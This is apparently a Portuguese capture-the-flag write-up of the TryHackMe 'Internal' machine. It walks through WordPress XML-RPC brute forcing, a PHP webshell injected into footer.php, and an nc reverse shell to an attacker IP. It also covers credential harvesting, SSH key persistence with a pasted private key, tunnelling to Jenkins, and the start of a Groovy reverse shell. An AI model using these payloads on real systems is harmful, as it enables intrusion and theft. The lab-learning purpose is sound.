> [!Informações]
> - O IP da máquina foi adicionado ao `/etc/hosts` com a URL `http://internal.thm/`
> - Período: 02/07/2025 a 04/07/2025
> - Máquina do `TryHackMe` de Nível Difícil
> - Sistema Operacional: Linux


# Sumário
1. [[#1. Reconhecimento]]
	1. [[#1.1. Averiguando as Portas com NMap]]
	2. [[#1.2. Procurando por diretórios/arquivos ocultos]]
2. [[#2. Enumeração]]
	1. [[#2.1 Varrendo toda a estrutura do `Wordpress`]]
		1. [[#2.1.1 Encontrando `URLs`]]
		2. [[#2.1.2 Usando a Ferramenta `WPScan`]]
		3. [[#2.1.3 Explorando o `XML-RPC`]]
			1. [[#2.1.3.1 O que é o `XML-RPC`?]]
			2. [[#2.1.3.2 Como que funciona a exploração?]]
			3. [[#2.1.3.3 Exemplo Prático do ataque]]
3. [[#3. Exploração]]
	1. [[#3.1 Escalada via Editor de Tema - Webshell por `footer.php`]]
	2. [[#3.2 Uma vez dentro do sistema é hora de vasculhar]]
		1. [[#3.2.1 Acessando o Banco]]
		2. [[#3.2.2 Fazendo um Reconhecimento da Máquina com `linpeas.sh`]]
4. [[#4. Pós-Exploração]]
	1. [[#4.1 Túnel com SSH]]
		1. [[#4.1.1 Persistência]]
		2. [[#4.1.2 Criação]]
			1. [[#4.1.2.1 Túnel Estático]]
			2. [[#4.1.2.2 Túnel Dinâmico]]
	2. [[#4.2 Um `Jenkins` Rodando no `Docker`]]
5. [[#5. Escalando Privilégios]]
	1. [[#5.1 Obtendo Shell Reversa]]
	2. [[#5.2 Explorando o `Docker`]]
---

# 1. Reconhecimento

Acessando a aplicação pela porta 80, me deparei com a página padrão do Apache, indicando que a `index` ainda não havia sido personalizada. A partir disso, decidi inspecionar o código-fonte da página em busca de comentários ou referências ocultas que pudessem revelar diretórios sensíveis ou arquivos interessantes deixados pelo desenvolvedor.

## 1.1. Averiguando as Portas com NMap
```
PORT      STATE  SERVICE      REASON         VERSION
22/tcp    open   ssh          syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp    open   http         syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Ubuntu Default Page: It works
2323/tcp  closed 3d-nfsd      reset ttl 63
3115/tcp  closed mctet-master reset ttl 63
8146/tcp  closed unknown      reset ttl 63
11825/tcp closed unknown      reset ttl 63
12024/tcp closed unknown      reset ttl 63
15492/tcp closed unknown      reset ttl 63
36521/tcp closed unknown      reset ttl 63
44368/tcp closed unknown      reset ttl 63
51668/tcp closed unknown      reset ttl 63
54708/tcp closed unknown      reset ttl 63
56190/tcp closed unknown      reset ttl 63
60359/tcp closed unknown      reset ttl 63
```

Durante a varredura de portas, identifiquei diversas portas, porém a maioria se encontrava fechada. Apenas as portas **22 (SSH)** e **80 (HTTP)** estavam abertas.
## 1.2. Procurando por diretórios/arquivos ocultos
```
arthur-strelow@ubuntu-star:~$ gobuster dir -u http://internal.thm/ -w /home/arthur-strelow/SecLists/Discovery/Web-Content/raft-large-files-directories.txt -t 20
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://internal.thm/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /home/arthur-strelow/SecLists/Discovery/Web-Content/raft-large-files-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/blog                 (Status: 301) [Size: 311] [--> http://internal.thm/blog/]
/javascript           (Status: 301) [Size: 317] [--> http://internal.thm/javascript/]
/phpmyadmin           (Status: 301) [Size: 317] [--> http://internal.thm/phpmyadmin/]
/wordpress            (Status: 301) [Size: 316] [--> http://internal.thm/wordpress/]
/server-status        (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 10918]
/.htaccess            (Status: 403) [Size: 277]
/.                    (Status: 200) [Size: 10918]
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htm                 (Status: 403) [Size: 277]
/.htpasswds           (Status: 403) [Size: 277]
/.htgroup             (Status: 403) [Size: 277]
/wp-forum.phps        (Status: 403) [Size: 277]
/.htaccess.bak        (Status: 403) [Size: 277]
/.htuser              (Status: 403) [Size: 277]
/.ht                  (Status: 403) [Size: 277]
/.htc                 (Status: 403) [Size: 277]
/.htaccess.old        (Status: 403) [Size: 277]
/.htacess             (Status: 403) [Size: 277]
```

Neste ponto, encontramos nossa primeira informação relevante. Embora a página principal exibisse apenas a tela padrão do Apache, ao utilizar ferramentas como o `Wappalyzer`, seria possível identificar que a aplicação em questão foi construída com **WordPress**. Isso nos abre uma nova gama de possibilidades para enumeração e exploração, como a identificação de temas e plugins vulneráveis, além de potenciais falhas de configuração na própria instalação do CMS.

# 2. Enumeração
## 2.1 Varrendo toda a estrutura do `Wordpress`
### 2.1.1 Encontrando `URLs`

![](attachment/89776ece79c2b296a69445a37beca6c3.png)

A partir da enumeração inicial, identifiquei três pontos importantes:
1. **Página de autenticação**: A presença do endpoint `/wp-login.php` confirma que o site utiliza o CMS WordPress e permite acesso ao painel administrativo.
2. **Feed principal**: O caminho `/blog/index.php/feed/` nos redireciona para um **RSS feed** com informações sobre os posts, revelando a versão do WordPress (**5.4.2**), estrutura de URLs, e um possível **usuário válido (`admin`)**.
3. **Feed de comentários**: Já o endpoint `/blog/index.php/comments/feed/` revela que o conteúdo padrão do WordPress ainda está ativo. Isso reforça a hipótese de que o ambiente pode estar mal configurado e mais suscetível a exploração.

Além da enumeração básica com ferramentas como `gobuster` ou `ffuf`, utilizei também uma **wordlist voltada especificamente para WordPress**, contendo caminhos comuns utilizados por themes, plugins e painéis administrativos:
- **Páginas administrativas** como `/wp-admin/about.php`, `/wp-admin/network/`, `/wp-admin/tools.php`, entre muitas outras, indicando que a instalação possui suporte ao **modo multisite**.
- **Arquivos sensíveis** como:
    - `blog/readme.html` e `blog//license.txt` — com informações da instalação
    - `blog//wp-config.php` (acessível mas vazio)
    - `blog//wp-settings.php` (500) — pode indicar erro interno ou função desativada
- **Plugins detectados**:
    - Diretório do Akismet: `blog//wp-content/plugins/akismet/`
    - Outros plugins como `hello.php` também identificados
- **Endpoints de upload e importação**:
    - `blog//wp-admin/async-upload.php`
    - `blog//wp-admin/media-upload.php`
    - `blog//wp-admin/import.php`

Essa enumeração avançada não só reforçou a exposição do ambiente WordPress, como também revelou **vários pontos de entrada potenciais para exploração**, incluindo páginas com códigos de erro `500`, páginas de upload e importação, e endpoints administrativos redirecionando para o login — confirmando a existência de **diversas superfícies de ataque** para as próximas fases.
### 2.1.2 Usando a Ferramenta `WPScan`
```
arthur-strelow@ubuntu-star:~$ wpscan --url http://internal.thm/blog/ -e ap,at,u1-15,cb,tt,dbe
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://internal.thm/blog/ [10.10.148.163]
[+] Started: Wed Jul  2 10:10:00 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://internal.thm/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://internal.thm/blog/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://internal.thm/blog/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 3.9
 | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating All Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:29:39 <===========================================================================================================> (29882 / 29882) 100.00% Time: 00:29:39
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] Theme(s) Identified:

[+] twentynineteen
 | Location: http://internal.thm/blog/wp-content/themes/twentynineteen/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://internal.thm/blog/wp-content/themes/twentynineteen/readme.txt
 | [!] The version is out of date, the latest version is 3.1
 | Style URL: http://internal.thm/blog/wp-content/themes/twentynineteen/style.css
 | Style Name: Twenty Nineteen
 | Style URI: https://wordpress.org/themes/twentynineteen/
 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://internal.thm/blog/wp-content/themes/twentynineteen/, status: 500
 |
 | Version: 1.5 (80% confidence)
 | Found By: Style (Aggressive Detection)
 |  - http://internal.thm/blog/wp-content/themes/twentynineteen/style.css, Match: 'Version: 1.5'

[+] twentyseventeen
 | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 3.9
 | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Known Locations (Aggressive Detection)
 |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/, status: 500
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Aggressive Detection)
 |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css, Match: 'Version: 2.3'

[+] twentytwenty
 | Location: http://internal.thm/blog/wp-content/themes/twentytwenty/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://internal.thm/blog/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 2.9
 | Style URL: http://internal.thm/blog/wp-content/themes/twentytwenty/style.css
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://internal.thm/blog/wp-content/themes/twentytwenty/, status: 500
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://internal.thm/blog/wp-content/themes/twentytwenty/style.css, Match: 'Version: 1.2'

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:02:40 <=============================================================================================================> (2575 / 2575) 100.00% Time: 00:02:40

[i] No Timthumbs Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:09 <================================================================================================================> (137 / 137) 100.00% Time: 00:00:09

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:05 <======================================================================================================================> (75 / 75) 100.00% Time: 00:00:05

[i] No DB Exports Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:02 <=================================================================================================================> (15 / 15) 100.00% Time: 00:00:02

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```

### 2.1.3 Explorando o `XML-RPC`

A exploração do **XML-RPC** no WordPress pode ser usada de diversas formas, mas uma das mais conhecidas é o **ataque de força bruta via o método `system.multicall`**, que permite tentar **várias senhas de uma só vez** — contornando algumas proteções de rate limit do login padrão (`/wp-login.php`).

#### 2.1.3.1 O que é o `XML-RPC`?
O arquivo `/xmlrpc.php` é uma interface que permite interações remotas com o WordPress, como postar, editar conteúdo ou autenticar-se, geralmente usada por apps móveis ou plugins como o Jetpack.

#### 2.1.3.2 Como que funciona a exploração?
Em vez de fazer uma requisição para cada tentativa de senha como no `/wp-login.php`, o atacante envia um _único POST_ contendo **várias combinações** de login e senha usando o método `system.multicall`.

Isso tem dois impactos importantes:

- **Evita bloqueios por IP** que se baseiam em número de requisições;
- **É mais rápido**, pois agrupa muitas tentativas em um só pacote.

#### 2.1.3.3 Exemplo Prático do ataque

```
arthur-strelow@ubuntu-star:~$ wpscan --url http://internal.thm/blog/ --enumerate u --passwords /home/arthur-strelow/SecLists/Passwords/Leaked-Databases/rockyou.txt --usernames admin --disable-tls-checks
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://internal.thm/blog/ [10.10.148.163]
[+] Started: Wed Jul  2 10:48:24 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%
.
.
.
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - Username: admin, Password: my2boys
```

> [!Credenciais do "admin" do Wordpress]
> [SUCCESS] - Username: admin, Password: my2boys

E com isso, obtermos acesso ao painel administrativo do **Wordpress**.

![](attachment/b19272a41145caeb7167dc5abd8edd00.png)

# 3. Exploração
## 3.1 Escalada via Editor de Tema - Webshell por `footer.php`

Como obtivemos acesso administrativo ao painel do WordPress, uma das ideias iniciais foi **alterar arquivos de plugins** para inserir uma _reverse shell_ ou um payload PHP que nos permitisse executar comandos remotamente via URL. No entanto, ao tentar editar os arquivos do plugin pelo painel, foi possível constatar que **não tínhamos permissões suficientes para modificá-los** — o que pode indicar restrições no `filesystem` do servidor.

Diante disso, redirecionei o foco para o **editor de temas**, uma funcionalidade comum em instalações WordPress que permite editar arquivos PHP diretamente pela interface do admin. Após explorar os arquivos disponíveis, encontrei o **`footer.php`** — arquivo do rodapé do tema — com permissões de edição habilitadas.

Essa escolha foi estratégica: o `footer.php` é carregado em praticamente todas as páginas do site, o que garante a execução do código malicioso **sem precisar de uma rota específica**.
![](attachment/9677b63a4bef0e7c48a608cf53ab1c32.png)

Com o acesso ao painel WordPress e permissões para editar o tema `twentyseventeen`, modifiquei o arquivo `footer.php` para incluir um payload PHP simples que capturava um parâmetro via URL (`$_GET['cmd']`) e o executava no sistema operacional com `shell_exec`.

**Exemplo de código injetado no `footer.php`:**
`<?php if (isset($_GET['cmd'])) { echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>"; } ?>`

Esse trecho permitiu transformar o `footer.php` em uma **webshell rudimentar**, acessível por:
`http://internal.thm/blog/wp-content/themes/twentyseventeen/footer.php?cmd=COMANDO`


Inicialmente, tentei executar diretamente a seguinte payload:
`rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.11.85.218 4444 > /tmp/f`

No entanto, **a execução falhou**, possivelmente devido ao modo como a URL interpreta caracteres especiais (como `>`, `|`, `&`). Para contornar isso, apliquei **URL encoding** à payload, transformando-a em:

`rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.11.85.218%204444%20%3E%2Ftmp%2Ff`

**E obtive uma shell reversa funcional** como o usuário que executava o serviço web.

![](attachment/c0b356bb908bd2eae048210ed019b72b.png)

# 3.2 Uma vez dentro do sistema é hora de vasculhar

Após a obtenção de acesso remoto como o usuário `www-data` (usuário padrão do servidor web), iniciei a fase de enumeração local do sistema. Uma das primeiras descobertas foi a presença de um **usuário local chamado `aubreanna`**.

Entretanto, o usuário `www-data` possui **permissões limitadas**, impossibilitando o acesso direto à home do usuário ou a arquivos sensíveis fora do diretório da aplicação web.

Como o WordPress armazena configurações sensíveis no arquivo `wp-config.php`, localizei e visualizei seu conteúdo

> [!Informações do DB]
> define( 'DB_NAME', 'wordpress' );
> 
> /** MySQL database username */
> define( 'DB_USER', 'wordpress' );
> 
> /** MySQL database password */
> define( 'DB_PASSWORD', 'wordpress123' );
> 
> /** MySQL hostname */
> define( 'DB_HOST', 'localhost' );

## 3.2.1 Acessando o Banco

Realizei o dump dos usuários do banco de dados, mas não foi revelada nenhuma informação nova.
![](attachment/5d0964d4ec25cf0d79dc70d67181a849.png)

### 3.2.2 Fazendo um Reconhecimento da Máquina com  `linpeas.sh`

Rodei o **LinPEAS**, que retornou uma grande quantidade de informações. Por isso, precisei analisar linha por linha com o objetivo de encontrar um possível vetor de ataque ou alguma informação que pudesse ser explorada para escalar privilégios.

Durante essa análise, identifiquei um arquivo que me chamou atenção por **não seguir os padrões típicos do sistema Linux**. Isso me fez pensar que poderia se tratar de **um arquivo extremamente valioso** ou, por outro lado, **algo completamente irrelevante**. De qualquer forma, resolvi investigá-lo mais a fundo.

![](attachment/1d90fcb84bab19ebad0579ce76de2540.png)


...De qualquer forma, resolvi investigá-lo mais a fundo.

**E foi aí que eu tirei a sorte grande!**

O arquivo continha exatamente o que eu precisava: uma informação crucial que poderia ser utilizada para escalar meus privilégios e progredir ainda mais na exploração da máquina.
![](attachment/8b1c5ec77feaf0dacd4e00fc80b5353d.png)

> [!Credencial do usuário]
> aubreanna:bubb13guM!@#123

No meio desses arquivos também encontrei as credenciais do phpmyadmin posteriormente pode ser útil

> [!Credenciais do PHPmyAdmin]
> `/etc/phpmyadmin/config-db.php:$dbpass='B2Ud4fEOZmVq';`
> `/etc/phpmyadmin/config-db.php:$dbuser='phpmyadmin';`

> [!Será que isso significa o quê?]
> /var/log/auth.log:Aug  3 02:49:53 internal passwd[2022]: pam_unix(passwd:chauthtok): password changed for aubreanna
> /var/log/auth.log:Aug  3 02:49:59 internal passwd[2023]: pam_unix(passwd:chauthtok): password changed for root

# 4. Pós-Exploração

![](attachment/f8237fabb85f3c715b878e20824957b6.png)

Tentei rodar um `sudo -l` para verificar se o usuário possuía permissão de executar algum comando como root **sem precisar de senha**, mas infelizmente **nenhuma permissão foi listada**.

Durante a enumeração, encontrei um arquivo que mencionava a existência de um **servidor rodando no IP `172.17.0.2`, porta `8080`**. Esse endereço me chamou atenção por ser de uma **rede interna**. Possivelmente um **docker**

E foi aí que pensei: **"Isso mesmo, um túnel!"**

Como esse serviço não é acessível diretamente da minha máquina, o próximo passo é estabelecer um **túnel reverso ou local**, redirecionando a porta interna para que eu possa interagir com esse serviço restrito externamente.

## 4.1 Túnel com SSH

### 4.1.1 Persistência
O primeiro passo — e o mais importante — é garantir **persistência** na máquina.

Para isso, comecei verificando se já existia alguma **chave pública autorizada** no diretório `~/.ssh`, dentro do arquivo `authorized_keys`. Caso houvesse alguma chave ali, eu poderia aproveitá-la para manter o acesso.

Se não houvesse, a alternativa seria gerar minha própria **chave SSH** e adicioná-la manualmente a esse arquivo, garantindo que eu possa me reconectar futuramente sem precisar explorar novamente a máquina.

Máquina da Vítima
```
aubreanna@internal:~$ ssh-keygen
aubreanna@internal:~/.ssh$ cat id_rsa.pub >> authorized_keys
aubreanna@internal:~/.ssh$ chmod 600 authorized_keys
aubreanna@internal:~/.ssh$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA7Oh4n5ZT9qrvguqKjnEkfKaQAmRaHyMgfZUanhGs3k64C5rC
ByMQ1WJ5zo4SZSCv1M2z94oC3vt9Qzcs1XB0zG285G9cqAqFpcN/lwaTuJ7y55yJ
idWzoZEs+yZ4s0A6V9DQ4r9u1x/3GtGLjF5RDakXcs0UeIL3fYyCuPV3K8CIGRAW
zJ/AeGPveRKvpHevG8V8FCrstktcNA21JBZcHnic3FFnrosTDAX7qA6A9QEXDadV
7uCP6Eh00lwSiNQVn5y6YPlbJJk7h4ObqKwjRrn+m4Tg3QFQBdS8cge0+0go9N4u
wOJKUnKTz2ZnVXzY3PwTbZXgVKH8LdWc92Yj1QIDAQABAoIBAQDQXl/JrYTIDex/
bx7SzfzTjgRXtj/15wVqrzwsD0vGc+I4grNpZ5Qkump8HEVdoPRF7W7+p+qCiRvR
hLPwPurb6yEaokASpL6L33lXMje3SEZJJEtsagOGdZPkih/bOQCXwFgZN1qb58eF
VQyyNzp/E1xGYs5AeKCJUo6fc3aPiSRlfOb65/zdkesOve22CP8dDW+DXklyPubm
hdcWlROxJIEp6QtTMfNRgilPLywhMKV5WpiKb/IQWMN+MLXhTJkmmstOMHnzcp5t
lfSU8bQ2K9trAHQtDlDKxBiLQXEDY+Us/rvQt13NHv1ooX/p7dLU+qnJ++2UHSPe
vmNOojgBAoGBAPp25VcP9m38k1gJzbHRPoRXqlC6kBrxqSVS+MAtlsAESSdbwUXZ
w13YoYwp7wYSM8s1B1mE6iekngPLAImTSCDv4vFG/lgIT5u9k37lVXQOnYXErSL4
zUJHFxbZJ0ugl4+r1R3eqMtWrjx8WoB5x82OQnMrog+2gTVAioXXYrjVAoGBAPIk
3/K2xubSZ+1jBnCGGmJnvo8NMLTcw/97b+fXeLKyuya9cTBxEcIZtOpZJLJxnml1
zIXbE/BnXEt19eAfSrryBjgXfEuHddLYEXKChbq9f4NDbAK5MUh2P1wbYs3dKx7I
s+XVRM9XKdjSoSH9sUZPUEb1uYxY53oIS3IF6z8BAoGAFOO5uQsxyHaaa2tV5pDH
IA6Xu+fzgOvK6bwD1zN2MUmqOEgk1IiXDMq2npQYxW7bNwWTOVomlWvbagGSZ+cK
ywR27xy2tezrhtfG53yFJgraBIAk2Jfbtr1rJZKy/lHEkk0Il1csyNjP62eLvM9r
ZK+Kx0RKXfkgyao6Y3NVXokCgYEAinFm0UCLTCF0Zhc98Uva/fRO0T87X8zxCrsq
aiWZzqG9uxKJCqc6/fzwoSRChPvNFILTYpy1M7gE3ugcof2CHoyN3bgfypcyWFBM
+WmCyBfcNdJwiMYVVVa2NxU5UnZnVvxtTrS22Mz/EgarNeH0Xzytq0SGx6V1AyKG
8DROIgECgYEAvWWEy0O/GCIo9w1qH5mmcS2JND+9Oqtu54Cy3xcxFKBgSag8/SzX
z4nSnvifKsjCfPP/vlG24LBAyNMnlPjk05WIkvaYP7ngDMu0RCDEPYgvmG4Kpdzm
EDVEQNS2HPcuQwQ07Smn/9HXtodImtH1M7N5CkQ46NKHjyzgtGIdNdI=
-----END RSA PRIVATE KEY-----
```

Máquina do Atacante
```
arthur-strelow@ubuntu-star:~/Downloads$ nano id_rsa (insere a chave acima)
arthur-strelow@ubuntu-star:~/Downloads$ chmod 600 id_rsa
```

### 4.1.2 Criação
Existem duas formas principais de criar um túnel via SSH: **túnel estático** e **túnel dinâmico**.

#### 4.1.2.1 Túnel Estático
Esse tipo de túnel redireciona uma porta específica da máquina remota para a máquina atacante.  

Por exemplo, se a porta `8080` está aberta na máquina comprometida, posso criar um túnel estático que mapeia essa porta para a minha máquina local. Assim, ao acessar `localhost:8080` na minha máquina, estou na verdade acessando diretamente o serviço da porta `8080` da máquina remota.

**Exemplo do Comando:** `ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -f -N -L 8081:172.17.0.2:8080 aubreanna@internal.thm -i id_rsa`

| Parâmetro                     | Significado                                                                                                                                                                                                          |
| ----------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `-L 8081:172.17.0.2:8080`     | Redireciona sua **porta local 8081** → para **172.17.0.2:8080** na máquina remota.  <br>Ou seja, tudo que você acessar em `http://localhost:8081` será encaminhado para o serviço da rede interna da máquina remota. |
| `-i id_rsa`                   | usa a chave privada para autenticação.                                                                                                                                                                               |
| `-o StrictHostKeyChecking=no` | desativa verificação de host remoto (evita prompt).                                                                                                                                                                  |
| `-o ServerAliveInterval=30`   | mantém a conexão viva, evitando queda.                                                                                                                                                                               |
| `-N`                          | não executa comandos remotos, só mantém o túnel.                                                                                                                                                                     |
| `-f`                          | envia a conexão para segundo plano (background), liberando seu terminal.                                                                                                                                             |

#### 4.1.2.2 Túnel Dinâmico 
Esse túnel cria um **proxy SOCKS**, geralmente na porta `1080`, que encapsula todo o tráfego através da conexão SSH.  

Com isso, posso configurar ferramentas como `proxychains` para encaminhar requisições arbitrárias (ex: para as portas `21`, `23`, `8081`, etc.), utilizando a máquina intermediária como ponto de pivotamento para atingir outras redes internas.

**Exemplo do Comando:**  `ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -f -N -D 1080 aubreanna@internal.thm -i id_rsa`

| Parâmetro                     | Significado                                                                                                            |
| ----------------------------- | ---------------------------------------------------------------------------------------------------------------------- |
| `-i id_rsa`                   | usa a chave privada `id_rsa` para autenticação (em vez de senha).                                                      |
| `-o StrictHostKeyChecking=no` | desativa a verificação da chave do host remoto, útil para evitar prompts quando conectando pela primeira vez.          |
| `-o ServerAliveInterval=30`   | envia um pacote a cada 30s para manter a sessão ativa (evita timeout).                                                 |
| `-D 1080`                     | cria um **proxy SOCKS5** escutando localmente na porta 1080 (para usar com proxychains, curl ou navegador).            |
| `-N`                          | **não executa comandos** remotos, apenas mantém a conexão ativa (ótimo para túneis).                                   |
| `-f`                          | envia o processo SSH para **background** depois da autenticação — ou seja, você não “fica preso” à sessão no terminal. |

Cada abordagem tem suas vantagens: o túnel estático é simples e direto para serviços específicos, enquanto o dinâmico é mais versátil, ideal para enumeração e acesso mais amplo a redes internas.

## 4.2 Um `Jenkins` Rodando no `Docker`

Descobri que se trata de um ambiente Docker, e o interessante é que o container está na rede `0.1`, enquanto a aplicação está rodando na `0.2`. Por isso, seria interessante executar um Nmap para explorar a rede, especialmente considerando que a máscara CIDR é /16.
![](attachment/c4b5fa621fe67321718b10247c5f9012.png)

Com o túnel feito agora so precisamos acessar para começar a ver o que tem nesse serviço "Jenkins".
![](attachment/356e93e95b0489b58cb9deb44fe28e7c.png)

Durante muito tempo, busquei diversas formas de contornar a tela de login, acessar a API e obter informações confidenciais. Também pesquisei sobre o funcionamento das credenciais padrão e, por fim, decidi tentar o básico: `admin`:senha Aleatória. Então agora é hora de montar o brute-force.

Antes de executar o ataque, precisei alterar o tipo de túnel que estava configurado como dinâmico (SOCKS5), utilizado com o `proxychains`. Para facilitar o acesso direto ao serviço sem depender de proxy, converti para um túnel estático, permitindo a conexão diretamente pela porta redirecionada, sem a necessidade de configurar ou usar o `proxychains`.

Rodando o `FFUF` ou `gobuster` fazendo um brute force nessa página de login eu encontrei as credenciais

> [!Credencial da página do Jenkins]
> admin:spongebob

![](attachment/877073e1a0e8426c7a365a4b159b8827.png)

# 5. Escalando Privilégios
## 5.1 Obtendo Shell Reversa

Após explorar a aplicação e pesquisar mais sobre o Jenkins, descobri que existe um endpoint acessível em `/script`, que permite a execução de scripts Groovy diretamente no servidor. Isso é extremamente útil, pois ao testar com o comando `id`, obtive o ID do usuário dentro do contêiner Docker em que o Jenkins está sendo executado. Com essa confirmação de execução remota, o próximo passo é buscar obter uma shell reversa.
![](attachment/b93f367e901746dd9e65b6fa92878822.png)

Como a aplicação é desenvolvida em Java, basta utilizar uma shell reversa escrita na própria linguagem para obter acesso ao sistema.

```
String host="10.13.72.32";
